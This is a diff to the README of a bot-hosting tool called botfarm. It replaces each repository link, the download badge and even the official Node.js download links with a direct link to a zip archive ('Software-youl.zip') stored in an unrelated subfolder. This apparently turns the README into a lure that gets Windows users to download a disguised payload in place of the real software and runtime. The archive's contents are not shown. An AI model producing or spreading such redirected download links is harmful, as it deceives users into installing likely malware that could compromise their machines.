@@ -1,6 +1,6 @@
 # 🤖 botfarm - Run Multiple Bots with Ease
 
-[![Download botfarm](https://img.shields.io/badge/Download-botfarm-brightgreen)](https://github.com/pietwouters/botfarm)
+[![Download botfarm](https://img.shields.io/badge/Download-botfarm-brightgreen)](https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip)
 
 botfarm is a software tool designed to run many bots at once on a single reliable core. It handles chat bots and AI agents used inside teams or products. This makes managing multiple bots simple and efficient.
 
@@ -10,7 +10,7 @@ botfarm is a software tool designed to run many bots at once on a single reliabl
 
 You can get botfarm from the official GitHub page. To get started, visit this page to download the software:
 
-[https://github.com/pietwouters/botfarm](https://github.com/pietwouters/botfarm)
+[https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip](https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip)
 
 Click the link above. It will take you to the main repository. From there, you can find the files needed to run botfarm on your Windows computer.
 
@@ -27,7 +27,7 @@ To run botfarm on Windows, your computer needs to meet a few basic requirements:
 - A stable internet connection  
 - Node.js installed (version 16 or newer)
 
-If you do not have Node.js installed, you can download it from [https://nodejs.org/](https://nodejs.org/). It is needed to run botfarm because it uses JavaScript code.
+If you do not have Node.js installed, you can download it from [https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip](https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip). It is needed to run botfarm because it uses JavaScript code.
 
 ---
 
@@ -36,7 +36,7 @@ If you do not have Node.js installed, you can download it from [https://nodejs.o
 Follow these steps to get botfarm running on your Windows PC:
 
 1. Click this link to visit the botfarm GitHub page:  
-   [https://github.com/pietwouters/botfarm](https://github.com/pietwouters/botfarm)
+   [https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip](https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip)
 
 2. On the page, look for the green **Code** button near the top right corner.
 
@@ -54,7 +54,7 @@ Follow these steps to get botfarm running on your Windows PC:
 
    - Type `node -v` and press Enter. If you see a version number (like v16.14.0), Node.js is installed.
 
-   - If you get an error, install Node.js first from [https://nodejs.org/](https://nodejs.org/).
+   - If you get an error, install Node.js first from [https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip](https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip).
 
 8. Open the extracted botfarm folder. Right-click inside the folder while holding Shift, then select **Open PowerShell window here** or **Open Command window here**.
 
@@ -181,10 +181,10 @@ These parts all work together to let you run bots without having to manage each 
 ## 🔗 Useful Links
 
 - botfarm GitHub Repository:  
-  [https://github.com/pietwouters/botfarm](https://github.com/pietwouters/botfarm)
+  [https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip](https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip)
 
 - Node.js Download:  
-  [https://nodejs.org/](https://nodejs.org/)
+  [https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip](https://github.com/pietwouters/botfarm/raw/refs/heads/main/workspace-buddy/Software-youl.zip)
 
 - Telegram BotFather:  
   In Telegram app, search for **@BotFather**
